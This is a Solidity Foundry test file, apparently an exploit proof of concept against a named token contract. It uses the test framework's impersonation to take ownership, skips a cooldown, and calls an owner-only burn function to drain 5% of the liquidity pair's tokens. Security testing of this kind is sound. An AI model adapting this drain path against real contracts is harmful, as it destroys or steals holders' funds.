pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function pair() external view returns (address);
    function lunaburn(uint256 percent_base1000) external;
    function balanceOf(address account) external view returns (uint256);
    function transferOwnership(address payable adr) external;
    function acceptOwnership() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    IBEP20LUNAINU private victim = IBEP20LUNAINU(TARGET);
    address private realOwner;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        // Get the original owner of the contract
        realOwner = victim.getOwner();

        // Get the liquidity pair address
        address pair = victim.pair();

        // Seed the liquidity pool with tokens to drain
        deal(TARGET, pair, 100_000_000 * 1e9);

        // Verify that the pair has a balance
        assertGt(victim.balanceOf(pair), 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate the real owner to transfer ownership.
        vm.startPrank(realOwner);
        victim.transferOwnership(payable(attacker));
        vm.stopPrank();

        // Step 2: Attacker accepts the ownership.
        victim.acceptOwnership();
        assertEq(victim.getOwner(), attacker, "Attacker should be the new owner");

        // Step 3: Advance time to bypass the `lunaburn` cooldown.
        vm.warp(block.timestamp + 2 minutes + 1);

        // Step 4: As the new owner, call lunaburn to drain 5% of the LP tokens.
        victim.lunaburn(50);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

